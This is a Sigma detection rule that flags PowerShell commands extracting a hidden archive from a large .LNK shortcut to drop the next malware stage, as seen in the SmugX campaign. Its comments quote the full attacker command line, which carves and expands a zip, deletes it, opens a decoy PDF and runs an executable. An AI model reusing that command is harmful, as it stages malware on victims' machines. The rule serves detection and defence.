title: PowerShell Execution With Potential Decryption Capabilities
id: 434c08ba-8406-4d15-8b24-782cb071a691
status: experimental
description: Detects PowerShell commands that decrypt an ".LNK" "file to drop the next stage of the malware.
references:
    - https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
author: X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)
date: 2023/06/30
tags:
    - attack.execution
logsource:
    product: windows
    category: process_creation
detection:
    #  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w h -c $mine=$env:localappdata;$ion=$mine+'\net.zip';cd $mine;$rotate=Get-ChildItem -r *.lnk|where-object {$_.length -gt 1650000}|Select-Object -ExpandProperty FullName;$past=[system.io.file]::ReadAllBytes($rotate);[System.IO.File]::WriteAllBytes($ion, $past[($past.length-1689419)..($past.length)]);cd $mine;Expand-Archive $ion . -EA 0 -Force|Out-Null;Remove-Item $ion -EA 0 -Force|Out-Null;cd Microsoft.NET;& '.\BMO-Code-of-Conduct.pdf';& '.\WsatConfig.exe'
    # B..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe-w h -c "$mine=$env:localappdata;$ion=$mine+'\net.zip';cd $mine;$rotate=Get-ChildItem -r *.lnk|where-object {$_.length -gt 1650000}|Select-Object -ExpandProperty FullName;$past=[system.io.file]::ReadAllBytes($rotate);[System.IO.File]::WriteAllBytes($ion, $past[($past.length-1689419)..($past.length)]);cd $mine;Expand-Archive $ion . -EA 0 -Force|Out-Null;Remove-Item $ion -EA 0 -Force|Out-Null;cd Microsoft.NET;& '.\BMO-Code-of-Conduct.pdf';& '.\WsatConfig.exe'"<C:\Program Files (x86)\Microsoft\Edge\Application
    selection_img:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        OriginalFileName:
            - 'PowerShell.EXE'
            - 'pwsh.dll'
    selection_cli_dir:
        CommandLine|contains:
            - "Get-ChildItem "
            - "dir "
            - "gci "
            - "ls "
    selection_cli_gc:
        CommandLine|contains:
            - "Get-Content "
            - "gc "
            - 'cat '
            - 'type '
            - 'ReadAllBytes'
    selection_cli_specific:
        - CommandLine|contains|all:
             - ' ^| '
             - '\*.lnk'
             - '-Recurse'
             - '-Skip '
        - CommandLine|contains|all:
             - ' -ExpandProperty '
             - '\*.lnk'
             - 'WriteAllBytes'
             - ' .length '
    condition: all of selection_*
falsepositives:
    - Unlikely
level: high
